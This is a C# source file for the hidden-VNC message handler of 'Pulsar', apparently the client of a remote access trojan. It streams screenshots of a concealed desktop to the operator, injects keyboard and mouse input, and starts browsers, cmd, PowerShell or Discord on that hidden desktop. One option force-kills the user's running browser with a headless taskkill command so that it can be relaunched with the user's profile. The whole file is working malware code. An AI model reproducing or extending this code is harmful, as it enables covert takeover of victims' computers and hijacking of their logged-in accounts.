﻿using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Threading;
using Pulsar.Client.Helper;
using Pulsar.Client.Helper.HVNC;
using Pulsar.Common.Enums;
using Pulsar.Common.Messages;
using Pulsar.Common.Messages.Monitoring.HVNC;
using Pulsar.Common.Messages.Other;
using Pulsar.Common.Networking;
using Pulsar.Common.Video;
using Pulsar.Common.Video.Codecs;

namespace Pulsar.Client.Messages
{
    public class HVNCHandler : IMessageProcessor, IDisposable
    {
        private UnsafeStreamCodec _streamCodec;
        private BitmapData _desktopData = null;
        private Bitmap _desktop = null;
        private ISender _clientMain;
        private Thread _captureThread;
        private CancellationTokenSource _cancellationTokenSource;


        private readonly ImageHandler ImageHandler = new ImageHandler("PulsarDesktop");
        private readonly InputHandler InputHandler = new InputHandler("PulsarDesktop");
        private readonly ProcessController ProcessHandler = new ProcessController("PulsarDesktop");

        // frame control variables
        private readonly ConcurrentQueue<byte[]> _frameBuffer = new ConcurrentQueue<byte[]>();
        private readonly AutoResetEvent _frameRequestEvent = new AutoResetEvent(false);
        private int _pendingFrameRequests = 0;

        //fps counting
        private int _framesSent = 0;
        private float _currentFps = 0f;

        // max buffer size to prevent memory issues
        private const int MAX_BUFFER_SIZE = 10;

        private readonly Stopwatch _stopwatch = new Stopwatch();

        public bool CanExecute(IMessage message)
        {
            return message is GetHVNCDesktop || message is DoHVNCInput || message is StartHVNCProcess;
        }

        public bool CanExecuteFrom(ISender sender)
        {
            return true;
        }

        public void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case GetHVNCDesktop getDesktop:
                    Execute(sender, getDesktop);
                    break;
                case DoHVNCInput doInput:
                    InputHandler.Input(doInput.msg, (IntPtr)doInput.wParam, (IntPtr)doInput.lParam);
                    break;
                case StartHVNCProcess startHVNCProcess:
                    Execute(sender, startHVNCProcess);
                    break;
            }
        }

        private void Execute(ISender client, GetHVNCDesktop message)
        {
            if (message.Status == RemoteDesktopStatus.Stop)
            {
                StopScreenStreaming();
            }
            else if (message.Status == RemoteDesktopStatus.Start)
            {
                StartScreenStreaming(client, message);
            }
            else if (message.Status == RemoteDesktopStatus.Continue)
            {
                Interlocked.Add(ref _pendingFrameRequests, message.FramesRequested);
                _frameRequestEvent.Set();
            }
        }

        private void StartScreenStreaming(ISender client, GetHVNCDesktop message)
        {
            var monitorBounds = ScreenHelperCPU.GetBounds(message.DisplayIndex);
            var resolution = new Resolution { Height = monitorBounds.Height, Width = monitorBounds.Width };

            if (_streamCodec == null)
                _streamCodec = new UnsafeStreamCodec(message.Quality, message.DisplayIndex, resolution);

            if (message.CreateNew)
            {
                _streamCodec?.Dispose();
                _streamCodec = new UnsafeStreamCodec(message.Quality, message.DisplayIndex, resolution);
            }

            if (_streamCodec.ImageQuality != message.Quality || _streamCodec.Monitor != message.DisplayIndex || _streamCodec.Resolution != resolution)
            {
                _streamCodec?.Dispose();
                _streamCodec = new UnsafeStreamCodec(message.Quality, message.DisplayIndex, resolution);
            }

            _clientMain = client;

            ClearFrameBuffer();
            Interlocked.Exchange(ref _pendingFrameRequests, message.FramesRequested);

            if (_captureThread == null || !_captureThread.IsAlive)
            {
                _cancellationTokenSource = new CancellationTokenSource();
                _captureThread = new Thread(() => BufferedCaptureLoop(_cancellationTokenSource.Token));
                _captureThread.Start();
            }
        }

        private void StopScreenStreaming()
        {
            _cancellationTokenSource?.Cancel();

            if (_captureThread != null && _captureThread.IsAlive)
            {
                _frameRequestEvent.Set();
                _captureThread.Join();
                _captureThread = null;
            }

            if (_desktop != null)
            {
                if (_desktopData != null)
                {
                    try
                    {
                        _desktop.UnlockBits(_desktopData);
                    }
                    catch
                    {
                    }
                    _desktopData = null;
                }
                _desktop.Dispose();
                _desktop = null;
            }

            if (_streamCodec != null)
            {
                _streamCodec.Dispose();
                _streamCodec = null;
            }

            ClearFrameBuffer();
            Interlocked.Exchange(ref _pendingFrameRequests, 0);
        }

        private void BufferedCaptureLoop(CancellationToken cancellationToken)
        {
            _stopwatch.Start();

            while (!cancellationToken.IsCancellationRequested)
            {
                try
                {
                    if (_frameBuffer.Count >= MAX_BUFFER_SIZE || _pendingFrameRequests <= 0)
                    {
                        _frameRequestEvent.WaitOne(500);

                        if (cancellationToken.IsCancellationRequested)
                            break;

                        continue;
                    }

                    byte[] frameData = CaptureFrame();
                    if (frameData != null)
                    {
                        _frameBuffer.Enqueue(frameData);
                        _framesSent++;

                        if (_stopwatch.ElapsedMilliseconds >= 1000)
                        {
                            _currentFps = _framesSent / (_stopwatch.ElapsedMilliseconds / 1000f);
                            _framesSent = 0;
                            _stopwatch.Restart();
                        }
                    }

                    while (_pendingFrameRequests > 0 && _frameBuffer.TryDequeue(out byte[] frameToSend))
                    {
                        SendFrameToServer(frameToSend, Interlocked.Decrement(ref _pendingFrameRequests) == 0);
                    }
                }
                catch (Exception)
                {
                    Thread.Sleep(100);
                }
            }
        }        
        
        private byte[] CaptureFrame()
        {
            try
            {
                _desktop = ImageHandler.Screenshot();

                if (_desktop == null)
                {
                    return null;
                }

                const PixelFormat codecPixelFormat = PixelFormat.Format32bppArgb;
                Bitmap processedBitmap = _desktop;
                
                if (_desktop.PixelFormat != codecPixelFormat)
                {
                    try
                    {
                        processedBitmap = new Bitmap(_desktop.Width, _desktop.Height, codecPixelFormat);
                        using (Graphics g = Graphics.FromImage(processedBitmap))
                        {
                            g.DrawImage(_desktop, 0, 0, _desktop.Width, _desktop.Height);
                        }
                        _desktop.Dispose();
                        _desktop = processedBitmap;
                    }
                    catch (Exception ex)
                    {
                        Debug.WriteLine($"Error converting pixel format: {ex.Message}");
                        // Continue with original bitmap if conversion fails
                        processedBitmap = _desktop;
                    }
                }

                _desktopData = processedBitmap.LockBits(new Rectangle(0, 0, processedBitmap.Width, processedBitmap.Height),
                    ImageLockMode.ReadWrite, processedBitmap.PixelFormat);

                using (MemoryStream stream = new MemoryStream())
                {
                    if (_streamCodec == null) throw new Exception("StreamCodec can not be null.");
                    _streamCodec.CodeImage(_desktopData.Scan0,
                        new Rectangle(0, 0, processedBitmap.Width, processedBitmap.Height),
                        new Size(processedBitmap.Width, processedBitmap.Height),
                        processedBitmap.PixelFormat, stream);

                    return stream.ToArray();
                }
            }
            catch (Exception)
            {
                return null;
            }
            finally
            {
                if (_desktopData != null)
                {
                    _desktop.UnlockBits(_desktopData);
                    _desktopData = null;
                }
                _desktop?.Dispose();
                _desktop = null;
            }
        }

        private void SendFrameToServer(byte[] frameData, bool isLastRequestedFrame)
        {
            if (frameData == null || _clientMain == null) return;

            try
            {
                _clientMain.Send(new GetHVNCDesktopResponse
                {
                    Image = frameData,
                    Quality = _streamCodec.ImageQuality,
                    Monitor = _streamCodec.Monitor,
                    Resolution = _streamCodec.Resolution,
                    Timestamp = DateTimeOffset.UtcNow.ToUnixTimeMilliseconds(),
                    IsLastRequestedFrame = isLastRequestedFrame,
                    Fps = _currentFps
                });
            }
            catch (Exception)
            {
            }
        }

        private void ClearFrameBuffer()
        {
            while (_frameBuffer.TryDequeue(out _)) { }
        }

        private void Execute(ISender client, StartHVNCProcess message)
        {
            string name = message.Path;
            bool dontCloneProfile = message.DontCloneProfile;

            var browserPaths = new Dictionary<string, string>
            {
                { "Chrome", Environment.GetEnvironmentVariable("PROGRAMFILES") + "\\Google\\Chrome\\Application\\chrome.exe" },
                { "Edge", Environment.GetEnvironmentVariable("PROGRAMFILES(X86)") + "\\Microsoft\\Edge\\Application\\msedge.exe" },
                { "Brave", Environment.GetEnvironmentVariable("PROGRAMFILES") + "\\BraveSoftware\\Brave-Browser\\Application\\brave.exe" },
                { "Opera", Environment.GetEnvironmentVariable("PROGRAMFILES") + "\\Opera\\opera.exe" },
                { "OperaGX", Environment.GetEnvironmentVariable("PROGRAMFILES") + "\\Opera GX\\opera.exe" },
                { "Mozilla", Environment.GetEnvironmentVariable("PROGRAMFILES") + "\\Mozilla Firefox\\firefox.exe" }
            };

            if (dontCloneProfile && browserPaths.TryGetValue(name, out string executablePath) && File.Exists(executablePath))
            {
                string browserProcess = name.ToLower().Replace("mozilla", "firefox").Replace("edge", "msedge").Replace("operagx", "opera");
                string killCommand = $"Conhost --headless cmd.exe /c taskkill /IM {browserProcess}.exe /F";
                Debug.WriteLine(killCommand);
                ProcessHandler.CreateProc(killCommand);
                Thread.Sleep(1000);
                
                Debug.WriteLine($"Direct starting browser: {executablePath}");

                ProcessHandler.CreateProc(executablePath);
                return;
            }

            var processActions = new Dictionary<string, Action>
            {
                { "Chrome", ProcessHandler.Startchrome },
                { "Explorer", ProcessHandler.StartExplorer },
                { "Cmd", ProcessHandler.StartCmd },
                { "Powershell", ProcessHandler.StartPowershell },
                { "Edge", ProcessHandler.StartEdge },
                { "Brave", ProcessHandler.StartBrave },
                { "Opera", ProcessHandler.StartOpera },
                { "OperaGX", ProcessHandler.StartOperaGX },
                { "Mozilla", ProcessHandler.StartFirefox },
                { "Discord", ProcessHandler.StartDiscord }
            };

            if (processActions.TryGetValue(name, out var action))
            {
                action();
            }
            else
            {
                ProcessHandler.StartGeneric(name);
            }
        }

        public void Dispose()
        {
            Dispose(true);
            GC.SuppressFinalize(this);
        }

        protected virtual void Dispose(bool disposing)
        {
            if (disposing)
            {
                Debug.WriteLine("HVNC Handler Disposed");
                StopScreenStreaming();
                ImageHandler.Dispose();
                InputHandler.Dispose();
                _streamCodec?.Dispose();
                _cancellationTokenSource?.Dispose();
                _frameRequestEvent?.Dispose();
            }
        }
    }
}
